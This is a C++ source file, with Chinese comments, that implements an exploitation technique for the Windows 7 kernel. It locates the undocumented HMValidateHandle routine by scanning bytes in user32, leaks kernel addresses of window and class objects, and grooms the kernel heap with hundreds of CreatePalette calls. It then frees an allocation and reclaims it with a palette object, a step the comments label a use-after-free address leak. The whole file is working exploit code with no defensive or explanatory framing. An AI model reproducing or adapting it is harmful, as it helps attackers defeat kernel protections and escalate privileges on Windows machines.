﻿// PalEtte-Windows7-WWW.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include <intrin.h>
#include <string.h>
#include <locale.h>
#include <windows.h>
#include <tlhelp32.h>

typedef HWND (__fastcall *My_HMValidateHandle)(
	HWND        Window,
	ULONG		Number
);

typedef struct _LARGE_UNICODE_STRING{
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

char  LpszMNames[0x2000] = { 0 };

LARGE_UNICODE_STRING Texts = { 0 };

My_HMValidateHandle HMValidateHandle = NULL;

ULONG PALETTE_Address = 0;


PVOID Find_Functions(LPCSTR Dll_Name, LPCSTR F_Name){
	HMODULE Dll_HMODULE = NULL;
	PVOID F_Address = NULL;
	Dll_HMODULE = LoadLibraryA(Dll_Name);
	if (Dll_HMODULE == NULL){
		printf("%s Find Error!\n", Dll_Name);
		return NULL;
	}
	printf("Address(%s):0x%p\n", Dll_Name, Dll_HMODULE);
	F_Address = GetProcAddress(Dll_HMODULE, F_Name);
	if (F_Address == NULL){
		printf("Function(%s) Find Error!\n", F_Name);
		return NULL;
	}
	printf("Address(%s):0x%p\n", F_Name, F_Address);

	return F_Address;
}

PVOID Find_HMValidateHandle(PVOID IsMenu_Address){
	ULONG HMV_Adr = 0;
	while (1){
		if (*(char *)IsMenu_Address == '\xE8'){
			(ULONG)HMV_Adr = (*(ULONG*)((char *)IsMenu_Address + 1));

			return ((char *)IsMenu_Address + 5) + HMV_Adr;
		}
		IsMenu_Address = (char *)IsMenu_Address + 1;
	}

	return 0;
}

ULONG64 Create_Window(VOID){
	HINSTANCE hInstance;
	HWND hwnd, pwd;      
	WNDCLASS wndclass = { 0 }; 

	memset(LpszMNames, 'F', 0x1000-0x08);

	hInstance = GetModuleHandleA(0);
	wndclass.style = CS_HREDRAW | CS_VREDRAW;
	wndclass.lpfnWndProc = DefWindowProc;
	wndclass.hInstance = hInstance;
	wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndclass.lpszMenuName = (LPCWSTR)LpszMNames;
	wndclass.lpszClassName = TEXT("case");

	if (!RegisterClass(&wndclass)){
		printf("Register Window Class Error!\n");
		return 1;
	}

	hwnd = CreateWindowEx(0, wndclass.lpszClassName, TEXT("WORDS"), 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);


	printf("hwnd:%p\n", hwnd);

	pwd = (HWND)HMValidateHandle(hwnd, 1);

	ULONG ulClientDelta = *(ULONG*)((ULONG)pwd + 0x10) - (ULONG)pwd;

	ULONG TagCls = *(ULONG*)((ULONG)pwd + 0x64) - ulClientDelta;

	PALETTE_Address = *(ULONG*)((ULONG)TagCls + 0x50);

	printf("TagCls:0x%p\n", TagCls);

	printf("TagWnd:0x%p\n", pwd);

	printf("PALETTE_Address:0x%p\n", PALETTE_Address);

	DestroyWindow(hwnd);
}



int main(INT argc, CHAR* argv[]){

	INT I = 0;

	HPALETTE HPAL = NULL;

	LOGPALETTE *Palette = NULL;

	HPALETTE HPAL_LIST[0x100] = { 0 };

	PVOID IsMenu_Address = NULL,HMValidateHandle_Address = NULL;

	IsMenu_Address = Find_Functions("user32.dll", "IsMenu");

	HMValidateHandle_Address = Find_HMValidateHandle(IsMenu_Address);

	printf("HMValidateHandle Address(0x%p)\n", HMValidateHandle_Address);

	(My_HMValidateHandle)HMValidateHandle = (My_HMValidateHandle)HMValidateHandle_Address;


	Create_Window();


	PALETTEENTRY *Entries = (PALETTEENTRY*)malloc(5*sizeof(PALETTEENTRY));

	memset(Entries,0 ,5 * sizeof(PALETTEENTRY));

	Palette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE)+(sizeof(PALETTEENTRY)* (0x3EA - 0x01)));

	Palette->palVersion = 0x0300;
	Palette->palNumEntries = 0x3EA;
	

	//内存缩紧
	while (I <= 0x500){
		CreatePalette(Palette);
		++I;
	}

	UnregisterClass(TEXT("case"), GetModuleHandleA(0));

	//UAF 地址泄露
	HPAL = CreatePalette(Palette);

	printf("HPALETTE:0x%p\n", HPAL);

	getchar();

	return 0;
}

